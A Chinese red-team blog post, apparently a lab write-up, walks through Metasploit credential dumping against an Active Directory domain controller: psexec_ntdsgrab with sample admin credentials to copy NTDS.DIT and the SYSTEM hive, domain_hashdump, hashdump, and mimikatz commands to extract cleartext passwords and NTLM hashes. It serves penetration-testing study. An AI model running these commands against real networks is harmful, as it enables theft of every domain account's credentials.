> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/TInOaQ5WPt27pWM_0tXfJQ)

渗透攻击红队

一个专注于红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDoZibS8XU01CtEtSbwM3VGr3qskOmA1VkccY0mwKTCq6u2ia1xYRwBn3A/640?wx_fmt=jpeg)

  

  

大家好，这里是 **渗透攻击红队** 的第 **35** 篇文章，本公众号会记录一些我学习红队攻击的复现笔记（由浅到深），不出意外每天一更

  

**Metasploit**

**psexec_ntdsgrab 模块的使用**

在 MSF 中使用 psexec_ntdsgrab 模块：

```
use auxiliary/admin/smb/psexec_ntdsgrab
set rhosts 192.168.2.25
set smbdomain god.org
set smbuser administrator
set smbpass Admin12345
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LJVsGOWM7oRcYxA6kqIAiaP4rZ6qdZjDGxZib3yszQ6M7fTTpF2SoV8hic76wDYdEKAWlPibd89iafYOFg/640?wx_fmt=png)

设置完后然后执行 exploit 运行（要运行两次，该脚本使用卷影拷贝服务）：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LJVsGOWM7oRcYxA6kqIAiaP4Eoico8dzzdjmTibQpj0s0lpic5GpBJKR95lObo6K5ykbeM23blqI2gMlg/640?wx_fmt=png)

可以通过 SMB 服务直接与域控制器进行身份验证，创建系统驱动的卷影复制，并将 NTDS.DIT 和 SYSTEM hive 的副本下载到 Metasploit 目录中。这些文件可以与 impacket 等其他工具一起使用，这些工具可用于执行活动目录密码哈希值的提取。ntds.dit 和 SYSTEM 会放在 /root/.msf4/loot/ 文件夹下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LJVsGOWM7oRcYxA6kqIAiaP4Sz6org8LgyvDc7aSe3GzhToVmNDVXPCOQ7Y8xIfLq5MFYJu4hfKFWQ/640?wx_fmt=png)

之后就可以使用 impacket 工具包等解析 ntds.dit 文件，导出域账号和域散列值了。

**Metasploit 会话获取域账号和哈希值**

首先是使用 msf 反弹了一个域控的 shell：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LJVsGOWM7oRcYxA6kqIAiaP4Ro3siauXicavUhv0PTnQDgsnCCenuibEJ31QoF1hp1kyfsbDFWAMBrHwA/640?wx_fmt=png)

然后使用 MSF 的后渗透模块：

```
use post/windows/gather/credentials/domain_hashdump
set session 2
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LJVsGOWM7oRcYxA6kqIAiaP4eb7CFlajpv5drxaBsXhzcu1LZ8R5icnBhicAOM1vNGeGx68tvKD7VJ4g/640?wx_fmt=png)

然后运行 exploit ：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LJVsGOWM7oRcYxA6kqIAiaP4AnxBGH5VC8iaWoZxe2JAOdbzI4uy9mWDVgLNRyCVvPz1wssicrf2ewPw/640?wx_fmt=png)

但是利用失败了，我也不知道为啥。

还可以使用 hashdump 来导出用户 hash：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LJVsGOWM7oRcYxA6kqIAiaP4WgmdNzPJyHfM6IIcdbRVswC1Rhn0LurhUYpHWMtzTzhdfQ98BSo6Kg/640?wx_fmt=png)

还可以通过 MSF 加载 mimikatz 来读取密码：

```
# 加载mimikaz
load mimikatz
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LJVsGOWM7oRcYxA6kqIAiaP4rfe8afwFXu5rGGjw0dM2WiciaVOepJax0BuD6r8DyDrWFHZZtwsP4Rvw/640?wx_fmt=png)

```
# 抓取明文密码
wdigest
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LJVsGOWM7oRcYxA6kqIAiaP4fvcuwV93Nicu4Y9Lia304Pl4Uf4ThfuoMGMM7rUUEja43PJP5Qs0HQsA/640?wx_fmt=png)

```
# 抓取明文密码
kerberos
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LJVsGOWM7oRcYxA6kqIAiaP4GELo5MpVfd8mMboOs7dYox7usGwyYmQ2Isn4LMnITEjFtMKtQITk6w/640?wx_fmt=png)

```
# 抓取加密后的ntlm、lm密码
msv
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LJVsGOWM7oRcYxA6kqIAiaP4vbzW8Ob2ZnRNia2FyyMZM5y04qYhJVoZcjrWyGgF9DN6HI64nIqTEyQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

渗透攻击红队

一个专注于渗透红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDdjBqfzUWVgkVA7dFfxUAATDhZQicc1ibtgzSVq7sln6r9kEtTTicvZmcw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDY9HXLCT5WoDFzKP1Dw8FZyt3ecOVF0zSDogBTzgN2wicJlRDygN7bfQ/640?wx_fmt=png)

点分享

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDRwPQ2H3KRtgzicHGD2bGf1Dtqr86B5mspl4gARTicQUaVr6N0rY1GgKQ/640?wx_fmt=png)

点点赞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDgRo5uRP3s5pLrlJym85cYvUZRJDlqbTXHYVGXEZqD67ia9jNmwbNgxg/640?wx_fmt=png)

点在看